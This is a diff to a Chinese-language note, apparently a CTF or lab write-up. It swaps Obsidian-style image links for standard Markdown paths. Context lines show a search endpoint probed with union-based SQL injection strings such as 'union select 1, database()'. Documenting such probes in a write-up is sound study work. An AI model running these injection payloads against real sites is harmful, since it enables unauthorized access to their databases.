@@ -1,14 +1,14 @@
-![[Pasted image 20230212085901.png|500]]
+![](<./img/Pasted image 20230212085901.png>)
 
 ```
 /
 ```
 
-![[Pasted image 20230212085944.png|700]]
+![](<./img/Pasted image 20230212085944.png>)
 
 点击左侧条目会发出请求
 
-![[Pasted image 20230212090816.png|500]]
+![](<./img/Pasted image 20230212090816.png>)
 
 ```
 /query?search=<name>
@@ -22,7 +22,7 @@
 /query?search=amazonis_planitia union select 1, 2
 ```
 
-![[Pasted image 20230212092806.png|300]]
+![](<./img/Pasted image 20230212092806.png>)
 
 ```
 /query?search=amazonis_planitia union select 1, database()
